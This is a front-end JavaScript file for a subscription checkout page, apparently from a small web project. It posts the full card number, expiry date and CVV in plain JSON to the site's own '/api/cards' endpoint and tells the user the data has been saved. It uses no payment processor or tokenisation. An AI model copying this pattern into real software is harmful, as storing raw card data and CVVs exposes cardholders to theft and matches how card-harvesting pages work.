import config from './config.js';

let selectedPlanDetails = null;
const paymentModal = new bootstrap.Modal(document.getElementById('paymentModal'));

function selectPlan(planName, amount, isYearly = false) {
    selectedPlanDetails = {
        plan: planName,
        amount: amount,
        isYearly: isYearly
    };

    // Actualizar el modal con los detalles del plan
    document.getElementById('selectedPlan').textContent = `${planName} ${isYearly ? '(Anual)' : '(Mensual)'}`;
    document.getElementById('selectedAmount').textContent = amount.toFixed(2);

    // Mostrar el modal
    paymentModal.show();
}

async function processPay() {
    const cardData = {
        cardHolder: document.getElementById('cardHolder').value,
        cardNumber: document.getElementById('cardNumber').value,
        expiryDate: document.getElementById('expiryDate').value,
        cvv: document.getElementById('cvv').value,
        plan: new URLSearchParams(window.location.search).get('plan'),
        price: new URLSearchParams(window.location.search).get('price')
    };

    try {
        const response = await fetch('/api/cards', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(cardData)
        });

        const result = await response.json();

        if (response.ok) {
            // Mostrar mensaje de éxito
            alert('¡Tarjeta registrada con éxito! Los datos han sido guardados.');
            
            // Redirigir a la página principal
            window.location.href = 'index.html';
        } else {
            alert(result.error || 'Error al guardar los datos de la tarjeta');
        }
    } catch (error) {
        console.error('Error:', error);
        alert('Error al procesar los datos. Por favor, intenta nuevamente.');
    }
}

// Validaciones básicas
document.getElementById('cardNumber').addEventListener('input', function(e) {
    // Permitir solo números y limitar a 16 dígitos
    this.value = this.value.replace(/\D/g, '').substring(0, 16);
    
    // Formatear con espacios cada 4 dígitos
    this.value = this.value.replace(/(\d{4})(?=\d)/g, '$1 ');
});

document.getElementById('expiryDate').addEventListener('input', function(e) {
    // Formato MM/YY
    let value = this.value.replace(/\D/g, '');
    if (value.length >= 2) {
        value = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
    this.value = value;
});

document.getElementById('cvv').addEventListener('input', function(e) {
    // Permitir solo números y limitar a 3-4 dígitos
    this.value = this.value.replace(/\D/g, '').substring(0, 4);
});

// Cuando se carga la página
document.addEventListener('DOMContentLoaded', () => {
    // Obtener los parámetros de la URL
    const urlParams = new URLSearchParams(window.location.search);
    const plan = urlParams.get('plan');
    const price = urlParams.get('price');

    // Mostrar el plan seleccionado
    if (plan && price) {
        document.getElementById('selectedPlan').textContent = `Plan ${plan.charAt(0).toUpperCase() + plan.slice(1)}`;
        document.getElementById('selectedPrice').textContent = `$${price}`;
    }

    // Manejar el envío del formulario
    const form = document.getElementById('payment-form');
    if (form) {
        form.addEventListener('submit', (e) => {
            e.preventDefault();
            processPay();
        });
    }
}); 